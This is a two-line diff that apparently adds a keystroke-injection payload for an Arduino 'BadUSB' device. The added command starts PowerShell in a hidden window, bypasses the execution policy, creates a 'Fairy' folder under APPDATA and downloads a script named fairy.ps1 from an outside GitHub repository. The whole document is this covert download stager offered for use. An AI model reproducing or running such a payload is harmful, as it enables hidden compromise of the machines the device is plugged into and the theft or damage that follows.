@@ -1,0 +1,2 @@
+# this command will be in the arduino
+powershell.exe  -WindowStyle Hidden -Command {Set-ExecutionPolicy Bypass -Scope Process -Force; New-Item $env:APPDATA -Name "Fairy" -ItemType "Directory" -Force; Set-Location -Path "$($env:APPDATA)\Fairy"; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/fairy.ps1' -OutFile fairy.ps1}
